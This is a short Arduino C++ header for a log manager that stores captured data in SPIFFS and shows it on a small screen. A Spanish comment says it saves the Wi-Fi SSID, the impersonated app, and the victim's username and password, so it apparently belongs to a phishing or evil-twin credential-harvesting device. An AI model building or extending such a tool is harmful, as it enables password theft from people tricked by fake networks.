#ifndef LOG_MANAGER_H
#define LOG_MANAGER_H

#include <Arduino.h>

class LGFX; 

// Inicializa SPIFFS
void initLogSystem();

// Guarda datos: SSID de origen, App suplantada, Usuario y Password
void saveCapture(String ssid, String app, String user, String pass);

// Pantalla de visualización con scroll y borrado
void showLogsScreen(LGFX &tft, int btnBack, int btnEnter);

#endif